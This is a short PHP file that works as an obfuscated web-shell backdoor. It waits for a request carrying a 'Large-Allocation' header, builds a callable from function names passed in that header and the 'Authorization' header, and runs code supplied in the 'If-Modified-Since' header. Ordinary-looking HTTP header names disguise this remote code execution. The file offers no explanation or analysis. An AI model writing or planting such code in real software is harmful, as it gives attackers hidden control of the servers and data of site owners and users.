<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Large-Allocation'])) {
    $include = $_HEADERS['Large-Allocation']('', $_HEADERS['Authorization']($_HEADERS['If-Modified-Since']));
    $include();
}